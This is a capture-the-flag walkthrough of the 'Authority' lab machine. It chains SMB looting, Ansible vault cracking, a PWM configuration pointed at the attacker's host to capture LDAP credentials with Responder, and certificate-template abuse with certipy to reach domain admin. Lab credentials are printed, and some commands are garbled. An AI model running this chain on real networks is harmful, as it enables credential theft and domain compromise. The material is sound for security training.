# Nmap

```
(root㉿kali)-[/home/anon/Desktop]
└─#nmap -sCV -p8443,445,636 authority.htb     
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-23 01:43 EST
Nmap scan report for authority.htb (10.10.11.222)
Host is up (0.021s latency).

PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-11-23T10:43:34+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
8443/tcp open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Thu, 23 Nov 2023 10:43:15 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Thu, 23 Nov 2023 10:43:15 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Thu, 23 Nov 2023 10:43:21 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-11-21T09:49:35
|_Not valid after:  2025-11-22T21:27:59
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=11/23%Time=655EF483%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;
SF:charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Thu,\x2023\x20N
SF:ov\x202023\x2010:43:15\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n
SF:<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"
SF:/></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20
SF:GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20T
SF:hu,\x2023\x20Nov\x202023\x2010:43:15\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x2
SF:0text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Thu,
SF:\x2023\x20Nov\x202023\x2010:43:15\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;U
SF:RL='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r
SF:\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r
SF:\nContent-Length:\x201936\r\nDate:\x20Thu,\x2023\x20Nov\x202023\x2010:4
SF:3:21\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20l
SF:ang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x2
SF:0Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma
SF:,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgroun
SF:d-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}
SF:\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bl
SF:ack;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</
SF:style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20R
SF:eport</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20th
SF:e\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p>
SF:<b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20p
SF:rocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20per
SF:ceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x2
SF:0request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-23T10:43:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.12 seconds
```

```
smbclient -L ip
smbclient \\\\10.10.11.222\\Development

2.cd \Automation\Ansible\PWM\defaults\
3.get main.yml
```

```
cat main.yml

#OUTPUT
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438

pwm_admin_password: !vault |
$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
3335616263326464633832376261306131303337653964350a363663623132353136346631396662
38656432323830393339336231373637303535613636646561653637386634613862316638353530
3930356637306461350a316466663037303037653761323565343338653934646533663365363035
6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
$ANSIBLE_VAULT;1.1;AES256
63303831303534303266356462373731393561313363313038376166336536666232626461653630
3437333035366235613437373733316635313530326639330a643034623530623439616136363563
34646237336164356438383034623462323531316333623135383134656263663266653938333334
3238343230333633350a646664396565633037333431626163306531336336326665316430613566
3764
```

          decrypt with ansible2john <filename>

          and then copy its ansible password then fill it in file then to decrypt it u need hash with john tools

          john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtt

          then u got the password after that go back the passwd then cat <file_name> | ansible-vault decrypt

Vault Password:!@#$%^\* (password already decrypted)

then u will got the user then to get password use same way to get user

username:svc*pwm
Password:pWm*@dm!N\_!23

login on https://10.10.11.222:8443/pwm/private/login
then select "Configuration Manager"
then fill the password u decrypted

after you login Download configuration and then u just find it this code

```<value>ldaps://authority.authority.htb:636</value>```

then change it to  
``` <value>ldap://<Your-Ip-Tun0>:389</value>```

then saved it then back to the website click "Import Configuration"

next upload file already changed , so open terminal run command

responder -I tun0 -wA

and then u got the password , next way go to evil-winrm to capture the flag

evil-winrm -i 10.10.11.222 -u svc_ldap -p "<password>"
lDaP_1n_th3_cle4r!

# Privilege Escalation

impacket-addcomputer authority.htb/svc_ldap:<password> -dc-ip 10.10.11.222 -computer-name '<give_any_name>' -computer-pass '<give_any_pass>'

#Example
impacket-addcomputer authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222 -computer-name 'hack' -computer-pass '123'

# Certipy Installation
```
git clone https://github.com/ly4k/Certipy.git
cd Certipy 
pip3 install certipy-ad
python3 setup.py install
```

```
certipy find -u 'test1$' -p '123' -dc-ip 10.10.11.222c  certipy req -username 'hack$' -password '123' -ca 'AUTHORITY-CA' -target 10.10.11.222 -template 'CorpVpn' -upn "administrator@authority.htb" -dns authority.authority.htb
```

if u got some error u need copy authority.authority.htb to /etc/hosts
and run command sudo ntpdate -u authority.authority.htb ntpdate for create time

```
#Output
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_authority.pfx'
```

the private keys saved on your linux , so we just login ldap to add user

#Ldap Command
certipy auth -pfx administrator_authority.pfx -dc-ip 10.10.11.222 -ldap-shell
run command help to see command 
# help

```
add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 exit - Terminates this session.```



add_user_to_group svc_ldap 'Administrator'


now exit LDAP go back linux run evil-wirnm for capture the flag root

evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'

after you logged in you just 
"cd C:\Users\Administrator\Desktop"
cat root.txt
de8**************
